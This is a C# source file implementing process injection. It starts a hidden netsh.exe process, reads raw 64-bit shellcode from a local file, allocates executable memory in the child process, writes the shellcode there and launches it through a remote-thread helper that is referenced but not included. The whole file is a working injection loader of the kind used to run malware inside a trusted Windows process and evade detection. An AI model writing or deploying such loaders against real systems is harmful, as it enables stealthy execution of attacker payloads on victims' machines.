using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace Test
{
    class Program
    {
        static void Main(string[] args)
        {

            var processName64 = @"C:\Windows\Sysnative\netsh.exe";

            //raw 64bit shellcode to inject 
            byte[] payload64 = File.ReadAllBytes(@"C:\temp\raw.bin");

            ProcessStartInfo info64 = new ProcessStartInfo(processName64);
            info64.CreateNoWindow = true; // no window.
            info64.UseShellExecute = false; // share console, output is interlaces.
            Process processChild64 = Process.Start(info64);
            var pid64 = processChild64.Id;

            //allocate the memory in the remote process
            IntPtr hProcess64 = Kernel32Imports.OpenProcess(Kernel32Imports.PROCESS_ALL_ACCESS, false, (uint)pid64);
            IntPtr pBaseAddress64 = Kernel32Imports.VirtualAllocEx(hProcess64, IntPtr.Zero, new UIntPtr((uint)payload64.Length * 2), Kernel32Imports.AllocationType.COMMIT, Kernel32Imports.MemoryProtection.EXECUTE_READWRITE);
            IntPtr dwSize64 = IntPtr.Zero;
            Kernel32Imports.WriteProcessMemory(hProcess64, pBaseAddress64, payload64, payload64.Length, out dwSize64);

            //call create remote thread 64
            Thread.Util.CreateRemoteThread64( (UInt32)hProcess64, (UInt32)pBaseAddress64, 0);

        }
    }

    public static class Kernel32Imports
    {
        // CreateRemoteThread, since ThreadProc is in remote process, we must use a raw function-pointer.
        [DllImport("kernel32")]
        public static extern IntPtr CreateRemoteThread(
          IntPtr hProcess,
          IntPtr lpThreadAttributes,
          uint dwStackSize,
          IntPtr lpStartAddress, // raw Pointer into remote process
          IntPtr lpParameter,
          uint dwCreationFlags,
          out uint lpThreadId
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32")]
        public static extern IntPtr GetCurrentProcess();

        public const uint PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFF;
        [DllImport("kernel32")]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);
    
        [Flags()]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        [Flags()]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            GUARD_Modifierflag = 0x100,
            NOCACHE_Modifierflag = 0x200,
            WRITECOMBINE_Modifierflag = 0x400
        }

    }
}
